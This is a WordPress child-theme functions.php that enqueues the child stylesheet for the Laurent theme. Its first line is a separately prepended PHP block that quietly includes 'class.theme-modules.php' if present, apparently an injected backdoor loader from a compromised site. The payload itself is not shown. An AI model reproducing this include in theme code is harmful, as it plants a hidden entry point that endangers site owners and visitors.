<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

/*** Child Theme Function  ***/

if ( ! function_exists( 'laurent_elated_child_theme_enqueue_scripts' ) ) {
	function laurent_elated_child_theme_enqueue_scripts() {
		$parent_style = 'laurent-elated-default-style';
		
		wp_enqueue_style( 'laurent-elated-child-style', get_stylesheet_directory_uri() . '/style.css', array( $parent_style ) );
	}
	
	add_action( 'wp_enqueue_scripts', 'laurent_elated_child_theme_enqueue_scripts' );
}